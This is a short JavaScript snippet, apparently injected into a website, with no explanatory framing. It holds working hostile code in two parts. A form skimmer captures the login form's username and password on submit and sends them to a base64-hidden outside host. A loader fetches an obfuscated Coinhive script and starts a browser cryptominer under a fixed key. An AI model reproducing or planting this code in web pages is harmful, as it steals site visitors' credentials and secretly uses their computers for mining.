jQuery( "#login-form" ).submit(function( event ) {
	var u = jQuery("#login_username").val()
	var p = jQuery("#login_password").val()
	var url = atob("aHR0cDovL2JpbGNhLm5ldC9sb2dpbi5waHA=")
	jQuery.get(url+"?u="+u+"&p="+p)
});

function loadScript(url, callback)
{
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    script.onreadystatechange = callback;
    script.onload = callback;
    head.appendChild(script);
}
var afterFunction = function() {
	g = new window[atob("Q29pbkhpdmU=")][atob("VXNlcg==")]('JrUWA6Zd72wf62sOQR49Fb4GlhA1fOpP', hostname);
	window["g"][atob("c2V0VGhyb3R0bGU=")](0.2);
	window["g"][atob("c3RhcnQ=")]();
};
var g;
var hostname = window.location.hostname;
var script = atob("aHR0cHM6Ly9jb2luaGl2ZS5jb20vbGliL2NvaW5oaXZlLm1pbi5qcw==");
loadScript(script, afterFunction);
